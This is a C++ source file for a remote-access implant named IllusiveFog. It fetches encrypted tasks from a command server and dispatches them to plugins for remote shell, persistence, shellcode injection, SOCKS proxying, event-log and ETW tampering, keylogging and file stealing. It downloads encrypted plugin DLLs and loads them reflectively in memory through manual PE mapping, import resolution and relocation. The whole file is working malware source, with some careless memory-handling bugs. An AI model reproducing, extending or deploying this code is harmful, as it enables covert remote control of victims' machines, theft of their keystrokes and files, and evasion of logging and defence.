IllusiveFog::MemoryManager::memory_manager_result IllusiveFog::MemoryManager::FreeParameter(LPVOID parameter) {
	__try {
		free(parameter);
		this->parameter_count--;
		return memory_s_ok;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return invalid_heap_freed;
	}
}
IllusiveFog::MemoryManager::memory_manager_result IllusiveFog::MemoryManager::FreeJobs(PJobs job) {
	__try {
		free(job);
		this->JobsCount--;
		return memory_s_ok;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return invalid_heap_freed;
	}
}
PJobs IllusiveFog::IllusiveFog::IllusiveFog_form_jobs() {
	//add checks errors and try blocks


	char* temp_get = (char*)MemoryManager::AllocateTemporary(this->dwtemp + get_content_length_buffer_size + 1);
	if (temp_get == NULL) {
		delete temp_get;
		return NULL;

	}
	char* parameter = (char*)MemoryManager::allocate_parameter(this->dwtemp);
	if (parameter == NULL) {
		MemoryManager::FreeTemporary(temp_get);
		temp_get = NULL;
		parameter = NULL;
		delete temp_get;
		delete parameter;
		return NULL;
	}
	char* temp_base_param = (char*)MemoryManager::AllocateTemporary(this->dwtemp + 1);
	if (temp_base_param == NULL) {
		MemoryManager::FreeParameter(parameter);
		MemoryManager::FreeTemporary(temp_get);
		temp_get = NULL;
		parameter = NULL;
		delete parameter;
		delete temp_get;
		delete temp_base_param;
		return NULL;
	}
	ZeroMemory(parameter, this->dwtemp);
	ZeroMemory(temp_get, get_content_length_buffer_size + this->dwtemp + 1);
	ZeroMemory(temp_base_param, this->dwtemp + 1);
	socketlib::send_get_request(IllusiveFog_agent_session->AgentGetRequest, temp_get, this->dest_address, temp_get, get_content_length_buffer_size + this->dwtemp);
	char* temp_ptr = strstr(&temp_get[10], "\r\n\r\n");
	if (temp_ptr == NULL)
		return NULL;
	temp_ptr += 4;
	PJobs _job = MemoryManager::AllocateJobs();
	if (temp_ptr == NULL)
		return NULL;
	__try {
		this->dwtemp = 0;
		char* temp_ptr1 = strstr(temp_ptr, "#");
		if (temp_ptr1 == NULL)
			return NULL;
		this->dwtemp = strlen(temp_ptr) - strlen(temp_ptr1 - 1);
		ZeroMemory(_job->jobid, 20);
		strncpy((char*)_job->jobid, temp_ptr, this->dwtemp);
		temp_ptr1 += 1;
		/*this->IllusiveFog_agent_result =*/ this->form_IllusiveFog_agent_requirements(_job, temp_ptr1);
		MemoryManager::FreeTemporary(temp_get);
		MemoryManager::FreeParameter(parameter);
		MemoryManager::FreeTemporary(temp_base_param);
		temp_get = NULL;
		parameter = NULL;
		temp_base_param = NULL;
		temp_ptr = NULL;
		temp_ptr1 = NULL;
		delete temp_get;
		delete parameter;
		delete temp_base_param;
		delete temp_ptr;
		delete temp_ptr1;
		if (this->IllusiveFog_agent_result == IllusiveFog_error_plugin_parse_failed) {
#ifdef _DEBUG
			this->IllusiveFog_debug(this->IllusiveFog_agent_result);
#endif
			IllusiveFog::IllusiveFog_agent_report_ec(IllusiveFog_error_plugin_parse_failed);
			return NULL;

		}
		else if (this->IllusiveFog_agent_result == IllusiveFog_s_plugin_unload) {
			FreeParameter(_job->parameter_ptr);
			FreeJobs(_job);
			return NULL;
		}
		else return _job;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return NULL;
	}
}

IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::form_IllusiveFog_agent_requirements(PJobs job, char* base_string) {
	//add checks custom error code and try block 
	__try {
		this->dwtemp = 0;
		this->dwtemp = utils::utils_convert_from_base64(base_string, NULL, this->dwtemp);
		char* temp_ptr_decoded = (char*)MemoryManager::AllocateTemporary(this->dwtemp + 1);
		ZeroMemory(temp_ptr_decoded, this->dwtemp + 1);
		utils::utils_convert_from_base64(base_string, temp_ptr_decoded, this->dwtemp);
		/*ZeroMemory(ctx.Iv, 16);
		ZeroMemory(ctx.RoundKey, 176);
		*/
		char* delimiter = strstr(temp_ptr_decoded, "<hr>");
		this->dwtemp = 0;
		this->dwtemp = strlen(temp_ptr_decoded) - strlen(delimiter);
		char* temp_ptr_iv = (char*)MemoryManager::AllocateTemporary(this->dwtemp + 1);
		ZeroMemory(temp_ptr_iv, this->dwtemp + 1);
		strncpy(temp_ptr_iv, temp_ptr_decoded, this->dwtemp);
		delimiter += strlen("<hr>");
		this->dwtemp = strlen(delimiter);
		char* temp_ptr_cipher = (char*)MemoryManager::AllocateTemporary(this->dwtemp + 1);
		ZeroMemory(temp_ptr_cipher, this->dwtemp + 1);
		strncpy(temp_ptr_cipher, delimiter, this->dwtemp);
		char* temp_ptr_hex_dec_iv = NULL;
		this->dwtemp = 0;
		this->dwtemp = utils::utils_convert_from_hex(temp_ptr_iv, NULL, this->dwtemp);
		temp_ptr_hex_dec_iv = (char*)MemoryManager::AllocateTemporary(this->dwtemp + 1);
		ZeroMemory(temp_ptr_hex_dec_iv, this->dwtemp + 1);
		utils::utils_convert_from_hex(temp_ptr_iv, temp_ptr_hex_dec_iv, this->dwtemp);
		this->dwtemp = 0;
		this->dwtemp = utils::utils_convert_from_hex(temp_ptr_cipher, NULL, this->dwtemp);
		char* temp_ptr_hex_dec_cipher = NULL;
		temp_ptr_hex_dec_cipher = (char*)MemoryManager::AllocateTemporary(this->dwtemp + 1);
		ZeroMemory(temp_ptr_hex_dec_cipher, this->dwtemp + 1);
		//	this->dwtemp = 0;

		utils::utils_convert_from_hex(temp_ptr_cipher, temp_ptr_hex_dec_cipher, this->dwtemp);

		/*this->dwtemp = strlen(temp_ptr_hex_dec_cipher);
		*/
		this->dwtemp = utils::utils_aes_decrypt((unsigned char*)IllusiveFog_agent_session->CommunicationKey, (unsigned char*)temp_ptr_hex_dec_iv, (unsigned char*)temp_ptr_hex_dec_cipher, this->dwtemp);
		if (this->dwtemp == 0)
			this->dwtemp = strlen(temp_ptr_hex_dec_cipher); // no padding ?
		job->parameter_ptr = (char*)MemoryManager::allocate_parameter(this->dwtemp + 1);
		ZeroMemory(job->parameter_ptr, this->dwtemp + 1);
		strncpy(job->parameter_ptr, temp_ptr_hex_dec_cipher, this->dwtemp);

		this->IllusiveFog_plugin_result = Plugin::parse_plugin(job, job->parameter_ptr);
		if (this->IllusiveFog_plugin_result == plugin_error_invalid_plugin) {
#ifdef _DEBUG
			this->IllusiveFog_debug(IllusiveFog_error_plugin_parse_failed);
#endif 
			MemoryManager::FreeParameter(job->parameter_ptr);
			MemoryManager::FreeJobs(job);
			this->IllusiveFog_agent_result = IllusiveFog_error_plugin_parse_failed;
		}
		else if (this->IllusiveFog_plugin_result == plugin_s_unload) {
			this->dwtemp = 0;
			ZeroMemory(job->plugin_param + strlen(job->plugin_param) - 1, 1);
			this->dwtemp = utils::utils_convert_from_hex(job->plugin_param + 1, NULL, this->dwtemp);
			char* unld_temp = (char*)malloc(this->dwtemp + 1);
			ZeroMemory(unld_temp, this->dwtemp + 1);
			utils::utils_convert_from_hex(job->plugin_param, unld_temp, this->dwtemp);
			this->dwtemp = Plugin::get_plugin(unld_temp);
			/*	if (this->dwtemp != 0)cleanup_plugin_export
			*/
			IllusiveFog_unload_plugin((plugins)this->dwtemp);
			this->dwplugin_temp = 0;
			this->IllusiveFog_agent_result = IllusiveFog_s_plugin_unload;

			this->IllusiveFog_agent_reporter((char*)" ", this->IllusiveFog_agent_session->CommunicationKey, job->jobid);
			free(unld_temp);
			unld_temp = NULL;
			delete unld_temp;
		}
		else {
			this->IllusiveFog_agent_result = IllusiveFog_s_ok;
		}
		this->dwtemp = 0;
		MemoryManager::FreeTemporary(temp_ptr_decoded);
		MemoryManager::FreeTemporary(temp_ptr_iv);
		MemoryManager::FreeTemporary(temp_ptr_cipher);
		MemoryManager::FreeTemporary(temp_ptr_hex_dec_iv);
		MemoryManager::FreeTemporary(temp_ptr_hex_dec_cipher);
		temp_ptr_decoded = NULL;
		temp_ptr_iv = NULL;
		temp_ptr_cipher = NULL;
		temp_ptr_hex_dec_iv = NULL;
		temp_ptr_hex_dec_cipher = NULL;
		delimiter = NULL;
		delete temp_ptr_decoded;
		delete temp_ptr_iv;
		delete temp_ptr_cipher;
		delete temp_ptr_hex_dec_iv;
		delete temp_ptr_hex_dec_cipher;
		delete delimiter;

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		IllusiveFog::IllusiveFog_agent_report_ec(IllusiveFog_error_form_agent_requirements_failed);
		return IllusiveFog_error_form_agent_requirements_failed;
	}

	return IllusiveFog_s_ok;

}

IllusiveFog::Plugin::plugin_result IllusiveFog::Plugin::parse_plugin(PJobs job, char* string) {

	this->return_plugin_results = plugin_error_invalid_plugin;
	if (job == NULL)
		return plugin_invalid_job;
	if (string == NULL || *string == NULL)
		return plugin_invalid_job;
	char* temp_ptr = NULL;
	for (int i = 0; i <= PLUGIN_COUNT; i++) {
		temp_ptr = strstr(string, this->hex_commands_plugin[i]);
		if (temp_ptr != NULL)
			this->return_plugin_results = this->set_plugin_job(job, temp_ptr, string);
		if (this->return_plugin_results != plugin_error_invalid_plugin)
			break;

	}
	temp_ptr = NULL;
	delete temp_ptr;
	return this->return_plugin_results;

}

IllusiveFog::Plugin::plugin_result IllusiveFog::Plugin::set_plugin_job(PJobs jobs, char* plugin, char* string) {

	if (!memcmp(hex_commands_plugin[0], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = SHELL_PLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[0]) + 3];
		jobs->plugin_page = this->plugin_path->ShellPluginPath;
		if (!this->plugin_loaded[0])jobs->plugin_loaded = false; else jobs->plugin_loaded = true;
		jobs->export_number = 1;
		jobs->plugin_pellets = false;
		return plugin_s_ok;

	}
	else if (!memcmp(hex_commands_plugin[1], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = PERSIST_PLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[1]) + 3];
		jobs->plugin_page = this->plugin_path->PersistPluginPath;
		if (!this->plugin_loaded[1])jobs->plugin_loaded = false; else jobs->plugin_loaded = true;
		jobs->export_number = 1;
		jobs->plugin_pellets = true;
		return plugin_s_ok;
	}
	else if (!memcmp(hex_commands_plugin[2], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = INJ_SHELLCOPLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[2]) + 3];
		jobs->plugin_page = this->plugin_path->InjShellCoPluginPath;
		jobs->export_number = 1;
		if (!this->plugin_loaded[2])jobs->plugin_loaded = false; else jobs->plugin_loaded = true;
		jobs->plugin_pellets = true;
		return plugin_s_ok;
	}
	else if (!memcmp(hex_commands_plugin[3], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = SELF_SOCKSPLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[3]) + 3];
		jobs->plugin_page = this->plugin_path->SelfSocksPluginPath;
		jobs->export_number = 1;
		if (!this->plugin_loaded[3])jobs->plugin_loaded = false; else jobs->plugin_loaded = true;
		jobs->plugin_pellets = false;
		return plugin_s_ok;
	}
	else if (!memcmp(hex_commands_plugin[4], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = LOAD_PLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[4]) + 3];
		jobs->plugin_page = this->plugin_path->LoadPluginPath;
		jobs->export_number = 1; //change this
		if (!this->plugin_loaded[4])jobs->plugin_loaded = false; else jobs->plugin_loaded = true;
		jobs->plugin_pellets = true;
		return plugin_s_ok;
	}
	else if (!memcmp(hex_commands_plugin[5], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = EVTX_PLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[5]) + 3];
		jobs->plugin_page = this->plugin_path->EVTXPluginPath;
		jobs->export_number = 1; //change this
		if (!this->plugin_loaded[5])jobs->plugin_loaded = false; else jobs->plugin_loaded = true;
		jobs->plugin_pellets = false;
		return plugin_s_ok;
	}
	else if (!memcmp(hex_commands_plugin[6], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = ETW_PLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[6]) + 3];
		jobs->plugin_page = this->plugin_path->ETWPluginPath;
		jobs->export_number = 1; //change this
		if (!this->plugin_loaded[6])jobs->plugin_loaded = false; else jobs->plugin_loaded = true;
		jobs->plugin_pellets = false;
		return plugin_s_ok;
	}
	else if (!memcmp(hex_commands_plugin[7], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = VERBOSE_PLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[7]) + 3];
		jobs->plugin_page = this->plugin_path->VerbosePluginPath;
		jobs->counter_landing = this->plugin_path->VerboseCounterPath;
		jobs->export_number = 1; //change this
		if (!this->plugin_loaded[7])jobs->plugin_loaded = false; else jobs->plugin_loaded = true;
		jobs->plugin_pellets = false;
		return plugin_s_ok;
	}
	else if (!memcmp(hex_commands_plugin[8], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = UNLOAD_PLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[8]) + 3];
		return plugin_s_unload;

	}
	else if (!memcmp(hex_commands_plugin[9], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = CLEANUP_PLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[9]) + 3];
		jobs->plugin_page = this->plugin_path->CleanupPluginPath;
		jobs->export_number = 1; //change this
		if (!this->plugin_loaded[9])jobs->plugin_loaded = false; else jobs->plugin_loaded = true;
		jobs->plugin_pellets = false;
		return plugin_s_ok;

	}
	else if (!memcmp(hex_commands_plugin[10], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = KEYLOG_PLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[10]) + 3];
		jobs->plugin_page = this->plugin_path->KeyLogPluginPath;
		jobs->export_number = 1; //change this
		if (!this->plugin_loaded[10])jobs->plugin_loaded = false; else jobs->plugin_loaded = true;
		jobs->plugin_pellets = true;
		return plugin_s_ok;

	}
	else if (!memcmp(hex_commands_plugin[11], plugin, strlen(hex_commands_plugin[0]))) {
		jobs->plugin = FILESTEALER_PLUGIN;
		jobs->plugin_param = &string[strlen(hex_commands_plugin[11]) + 3];
		jobs->plugin_page = this->plugin_path->FileStealerPluginPath;
		jobs->export_number = 1; //change this
		if (!this->plugin_loaded[10])jobs->plugin_loaded = false; else jobs->plugin_loaded = true;
		jobs->plugin_pellets = true;
		return plugin_s_ok;

	}


	else return plugin_error_invalid_plugin;



}
IllusiveFog::MemoryManager::memory_manager_result   IllusiveFog::MemoryManager::free_plugin_info(LPVOID plugin_info) {
	__try {
		free(plugin_info);
		this->plugin_info_count--;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return invalid_heap_freed;
	}
}
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_load_plugin(PJobs jobs, char* get_content_length_buffer, char* get_request_buffer, char* plugin_request) {
	__try {
		if (jobs->plugin_loaded)
			return IllusiveFog_error_plugin_already_loaded;
		char* plugin_request = (char*)MemoryManager::AllocateTemporary(50 + strlen(IllusiveFog_agent_session->AgentPluginPath) + strlen(jobs->plugin_page) + 1); //fix this size
		ZeroMemory(plugin_request, 50 + strlen(IllusiveFog_agent_session->AgentPluginPath) + 1);
		strcpy(plugin_request, IllusiveFog_agent_session->AgentPluginPath);
		strcat(plugin_request, jobs->plugin_page);
		this->dwtemp = 0;
		this->socket_result = socketlib::socket_get_content_length(plugin_request, this->dest_address, get_content_length_buffer, get_request_buffer, &this->dwtemp);
		if (this->dwtemp == 0) {
			free(plugin_request);
			plugin_request = (char*)MemoryManager::AllocateTemporary(50 + strlen(IllusiveFog_agent_session->AgentPluginPath) + strlen(jobs->counter_landing) + 1);
			ZeroMemory(plugin_request, 50 + strlen(IllusiveFog_agent_session->AgentPluginPath) + 1);
			strcpy(plugin_request, IllusiveFog_agent_session->AgentPluginPath);
			strcat(plugin_request, jobs->counter_landing);
			this->dwtemp = 0;
			ZeroMemory(get_content_length_buffer, get_content_length_request_size + 1);
			this->socket_result = socketlib::socket_get_content_length(plugin_request, this->dest_address, get_content_length_buffer, get_request_buffer, &this->dwtemp);
		}
		ZeroMemory(get_request_buffer, get_content_length_buffer_size);
		ZeroMemory(get_content_length_buffer, get_content_length_request_size + 1);
		DWORD written_size = 0;

		char* new_temp = socketlib::download(plugin_request, this->dest_address, this->dwtemp, (DWORD)&written_size, get_request_buffer);
		char* get_plugin_request = (char*)MemoryManager::AllocateTemporary(written_size + 1); //fix this size
		ZeroMemory(get_plugin_request, written_size + 1);
		memcpy(get_plugin_request, new_temp, written_size);
		free(new_temp);
		new_temp = NULL;
		delete new_temp;
		//	socketlib::download(plugin_request, this->dest_address, this->dwtemp + get_content_length_buffer_size, get_plugin_request, get_request_buffer);
		Pplugin_info plug_info = MemoryManager::allocate_plugin_info();
		this->IllusiveFog_agent_result = this->form_IllusiveFog_agent_plugin_requirements(get_plugin_request, written_size, jobs, plug_info); //check for conditions
		if (this->IllusiveFog_agent_result != IllusiveFog_s_ok) {
			IllusiveFog::IllusiveFog_agent_report_ec(this->IllusiveFog_agent_result);
#ifdef _DEBUG
			this->IllusiveFog_debug(this->IllusiveFog_agent_result);
#endif
			//report	
		}
		else {
			this->IllusiveFog_agent_result = this->IllusiveFog_set_plugin(jobs->plugin, plug_info);
		}
		MemoryManager::free_plugin_info(plug_info);
		MemoryManager::FreeTemporary(plugin_request);
		MemoryManager::FreeTemporary(get_plugin_request);
		plugin_request = NULL;
		get_plugin_request = NULL;
		delete plugin_request;
		delete get_plugin_request;
		if (this->IllusiveFog_agent_result != IllusiveFog_s_ok) {
#ifdef _DEBUG 
			this->IllusiveFog_debug(this->IllusiveFog_agent_result);
#endif
			/*	reporter::form_error_code_parameter()*/
			return this->IllusiveFog_agent_result;
		}
		return IllusiveFog_s_ok;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		IllusiveFog::IllusiveFog_agent_report_ec(IllusiveFog_error_plugin_load_failed);
		return IllusiveFog_error_plugin_load_failed;
	}

}

IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_set_plugin(enum plugins plugin, Pplugin_info plug_info) {
	Plugin::plugin_loaded[plugin] = true;
	PluginManager::set_plugin(plugin, plug_info->export_addr);

	return IllusiveFog_s_ok;
}

IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_unset_plugin(enum plugins plugin) {
	PluginManager::unset_plugin(plugin);
	Plugin::plugin_loaded[plugin] = false;

	return IllusiveFog_s_ok;

}
DWORD IllusiveFog::Plugin::get_plugin(char* plugin) {
	//add checks errors and try block
	for (int i = 0; i <= PLUGIN_COUNT; i++) {
		char* temp_ptr = strstr(plugin, this->hex_commands_plugin[i]);
		if (temp_ptr != NULL)
			return i;
	}

	return plugin_s_ok;

}
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_set_ecpath(char* ec_param, char* dest) {
	__try {
		this->IllusiveFog_report = MemoryManager::allocate_IllusiveFog_reporter();
		this->IllusiveFog_report->IllusiveFog_ec_path = (char*)malloc(strlen(this->IllusiveFog_agent_session->AgentErrorCodePath) + 1);
		this->IllusiveFog_report->IllusiveFog_param = (char*)malloc(strlen(ec_param) + 1);
		this->IllusiveFog_report->dest = (char*)malloc(strlen(dest) + 1);
		ZeroMemory(this->IllusiveFog_report->IllusiveFog_ec_path, strlen(this->IllusiveFog_agent_session->AgentErrorCodePath) + 1);
		ZeroMemory(this->IllusiveFog_report->IllusiveFog_param, strlen(ec_param));
		ZeroMemory(this->IllusiveFog_report->dest, strlen(dest));
		strcpy(this->IllusiveFog_report->dest, dest);
		strcpy(this->IllusiveFog_report->IllusiveFog_ec_path, this->IllusiveFog_agent_session->AgentErrorCodePath);
		strcpy(this->IllusiveFog_report->IllusiveFog_param, ec_param);
		return IllusiveFog_s_ok;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

	}
}

//remove plugin_size
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::form_IllusiveFog_agent_plugin_requirements(char* plugin, DWORD plugin_size, PJobs job, Pplugin_info plug_info) {
	//add checks errors and try block
	__try {
		char* temp_ptr = strstr(&plugin[10], "\r\n\r\n");
		if (temp_ptr == NULL)
			return IllusiveFog_error_agent_plugin_req_failed;
		temp_ptr += 4;
		this->dwtemp = 0;
		char* tempptr1 = NULL;
		this->dwtemp = utils::utils_convert_from_base64(temp_ptr, NULL, this->dwtemp);
		tempptr1 = (char*)MemoryManager::AllocateTemporary(this->dwtemp + 1);
		ZeroMemory(tempptr1, this->dwtemp + 1);
		utils::utils_convert_from_base64(temp_ptr, tempptr1, this->dwtemp);
		char* delimiter = strstr(tempptr1, "<hr>");
		this->dwtemp = strlen(tempptr1) - strlen(delimiter);
		char* hexediv = (char*)MemoryManager::AllocateTemporary(this->dwtemp + 1);
		ZeroMemory(hexediv, this->dwtemp + 1);
		strncpy(hexediv, tempptr1, this->dwtemp);
		this->dwtemp = 0;
		this->dwtemp = utils::utils_convert_from_hex(hexediv, NULL, this->dwtemp);
		char* iv = (char*)MemoryManager::AllocateTemporary(this->dwtemp + 1);
		ZeroMemory(iv, this->dwtemp + 1);
		utils::utils_convert_from_hex(hexediv, iv, this->dwtemp);
		delimiter += strlen("<hr>");
		this->dwtemp = strlen(delimiter);
		char* szplugin = (char*)MemoryManager::AllocateTemporary(this->dwtemp + 1);
		ZeroMemory(szplugin, this->dwtemp + 1);
		strncpy(szplugin, delimiter, this->dwtemp);
		this->dwtemp = 0;
		this->dwtemp = utils::utils_convert_from_hex(szplugin, NULL, this->dwtemp);
		char* unplugin = (char*)MemoryManager::AllocateTemporary(this->dwtemp + 1);
		ZeroMemory(unplugin, this->dwtemp + 1);
		utils::utils_convert_from_hex(szplugin, unplugin, this->dwtemp);
		DWORD dw_write = this->dwtemp;
		this->dwtemp = utils::utils_aes_decrypt((unsigned char*)IllusiveFog_agent_session->Plugin_key, (unsigned char*)iv, (unsigned char*)unplugin, this->dwtemp);
		this->IllusiveFog_plugin_result = Plugin::plugin_load(job->export_number, (PBYTE)unplugin, job, plug_info);
		MemoryManager::FreeTemporary(tempptr1);
		MemoryManager::FreeTemporary(hexediv);
		MemoryManager::FreeTemporary(iv);
		MemoryManager::FreeTemporary(szplugin);
		MemoryManager::FreeTemporary(unplugin);
		delimiter = NULL;
		temp_ptr = NULL;
		hexediv = NULL;
		iv = NULL;
		tempptr1 = NULL;
		szplugin = NULL;
		unplugin = NULL;
		delete delimiter;
		delete temp_ptr;
		delete hexediv;
		delete iv;
		delete tempptr1;
		delete szplugin;
		delete unplugin;
		if (this->IllusiveFog_plugin_result == plugin_error_load_plugin_failed) {
#ifdef _DEBUG
			this->IllusiveFog_plugin_debug(this->IllusiveFog_plugin_result);

#endif
			return IllusiveFog_error_agent_plugin_req_failed;
		}
		return IllusiveFog_s_ok;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return IllusiveFog_error_agent_plugin_req_failed;

	}
}

IllusiveFog::Plugin::plugin_result IllusiveFog::Plugin::plugin_load(DWORD export_number, PBYTE plugin_memory, PJobs job, Pplugin_info plug_info) {
	__try {
		if (this->bset == false)
			PluginManager::initialize_plugin_manager();

		this->plugin_ldr_map(NULL, plugin_memory);
		this->plugin_ldr_form_iat();
		/*this->resolve_delay_imports();
		*/
		this->plugin_ldr_relocate();
		this->plugin_ldr_set_protection();
		plug_info->export_addr = this->plugin_ldr_get_exports(this->export_directory, export_number);
		plug_info->allocated_plugin = this->memory;
		memcpy(&this->va_plugin_memory[job->plugin], &this->memory, sizeof(LPVOID));
		memcpy(&this->va_plugin_memory_size[job->plugin], &this->dwplugin_temp, sizeof(DWORD));
		this->plugin_ldr_cleanup();

		return plugin_s_ok;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return plugin_error_load_plugin_failed;
	}
}
IllusiveFog::Plugin::plugin_result IllusiveFog::Plugin::plugin_unload(enum plugins plugin) {
	VirtualFree(this->va_plugin_memory[plugin], NULL, MEM_RELEASE);
	return plugin_s_ok;
}
IllusiveFog::Plugin::plugin_result IllusiveFog::Plugin::plugin_ldr_map(DWORD file_size, PBYTE dll_memory) {
	//add checks errors and try block and fix routine dos_head = (PIMAGE_DOS_HEADER)dll_memory;
	dos_head = (PIMAGE_DOS_HEADER)dll_memory;
	nt_head = (PIMAGE_NT_HEADERS)(dos_head->e_lfanew + (PBYTE)dll_memory);
	PIMAGE_SECTION_HEADER section_head = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(nt_head);
	DWORD rva_low = 0;
	DWORD rva_high = 0;
	for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
		if (!section_head[i].Misc.VirtualSize)
			continue;
		if (section_head[i].VirtualAddress < rva_low)
			rva_low = section_head->VirtualAddress;
		if ((section_head[i].VirtualAddress + section_head[i].Misc.VirtualSize) > rva_high)
			rva_high = section_head[i].VirtualAddress + section_head[i].Misc.VirtualSize;

	}

	this->memory = (PBYTE)VirtualAlloc(NULL, rva_high - rva_low, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	CopyMemory((LPVOID)((DWORD)this->memory), dll_memory, sizeof(IMAGE_DOS_HEADER));
	CopyMemory((LPVOID)(DWORD)((PBYTE)this->memory + sizeof(IMAGE_DOS_HEADER)), (PBYTE)dll_memory + sizeof(IMAGE_DOS_HEADER), sizeof(IMAGE_NT_HEADERS));
	section_head = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(nt_head);
	//	nt_head->OptionalHeader.SizeOfImage=section_head[i-1].VirtualAddress+
	DWORD sect_size = 0;
	for (int i = 0; i <= nt_head->FileHeader.NumberOfSections; i++) {
		sect_size = min(section_head[i].Misc.VirtualSize, section_head[i].SizeOfRawData);
		CopyMemory((LPVOID)((DWORD)this->memory + section_head[i].VirtualAddress), (LPVOID)((DWORD)dll_memory + section_head[i].PointerToRawData),
			sect_size);

	}

	sect_size = 0;
	this->delta = (DWORD)this->memory - nt_head->OptionalHeader.ImageBase;
	return plugin_s_ok;


}

IllusiveFog::Plugin::plugin_result IllusiveFog::Plugin::plugin_ldr_relocate() {
	//add try block
	IMAGE_BASE_RELOCATION* relocation = (IMAGE_BASE_RELOCATION*)((DWORD)this->memory + this->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	IMAGE_BASE_RELOCATION* relocation_end = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)relocation + this->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size - sizeof(IMAGE_BASE_RELOCATION));
	WORD* reloc_item = 0;
	DWORD num_items = 0;
	for (; relocation < relocation_end; relocation = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)relocation + relocation->SizeOfBlock)) {
		reloc_item = (WORD*)(relocation + 1);
		num_items = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		for (int i = 0; i < num_items; ++i, ++reloc_item) {
			switch (*reloc_item >> 12) {
			case IMAGE_REL_BASED_ABSOLUTE:
				break;
			case IMAGE_REL_BASED_HIGHLOW:
				*(DWORD_PTR*)((DWORD)this->memory + relocation->VirtualAddress + (*reloc_item & 0xFFF)) += this->delta;
			}
		}
	}


	return plugin_s_ok;
}

IllusiveFog::Plugin::plugin_result IllusiveFog::Plugin::plugin_ldr_form_iat() {
	//add try block
	PIMAGE_IMPORT_DESCRIPTOR impdesc = (PIMAGE_IMPORT_DESCRIPTOR)(nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (DWORD)this->memory);
	PCHAR name = NULL;
	LPVOID dll = NULL;
	PIMAGE_THUNK_DATA thunk_data_one = NULL;
	PIMAGE_THUNK_DATA thunk_data_two = NULL;
	PULONG_PTR func_ptr = NULL;
	PIMAGE_IMPORT_BY_NAME image_name = NULL;
	PIMAGE_THUNK_DATA thunk_data_3 = NULL;
	for (; impdesc->Name != 0; impdesc++) {
		name = (PCHAR)((DWORD)this->memory + impdesc->Name);
		dll = (LPVOID)LoadLibraryA(name);
		thunk_data_one = (PIMAGE_THUNK_DATA)((DWORD)this->memory + impdesc->OriginalFirstThunk);
		thunk_data_two = (PIMAGE_THUNK_DATA)((DWORD)this->memory + impdesc->FirstThunk);
		for (;; thunk_data_one++, thunk_data_two++) {
			if (thunk_data_one->u1.AddressOfData == 0)
				break;
			thunk_data_3 = thunk_data_two;
			//thunk_data_3 = (thunk_data_two->u1.Function);
			if (IMAGE_SNAP_BY_ORDINAL(thunk_data_one->u1.Ordinal)) {
				//	*func_ptr = (DWORD_PTR)((GetProcAddress((HMODULE)dll, (LPCSTR)IMAGE_ORDINAL(thunk_data_one->u1.Ordinal))));
				thunk_data_3->u1.Function = (DWORD)((GetProcAddress((HMODULE)dll, (LPCSTR)IMAGE_ORDINAL(thunk_data_one->u1.Ordinal))));
			}
			else {
				image_name = (PIMAGE_IMPORT_BY_NAME)((DWORD)this->memory + thunk_data_one->u1.AddressOfData);
				if (dll == NULL)
					continue;
				if (image_name->Name == NULL)
					continue;
				thunk_data_two->u1.Function = (DWORD)GetProcAddress((HMODULE)dll, (LPCSTR)image_name->Name);
			}
		}
	}
	return plugin_s_ok;


}

IllusiveFog::Plugin::plugin_result IllusiveFog::Plugin::plugin_ldr_cleanup() {
	this->img_exports = NULL;
	this->dos_head = NULL;
	this->nt_head = NULL;
	this->section_head = NULL;
	this->delta = 0;
	return plugin_s_ok;
}

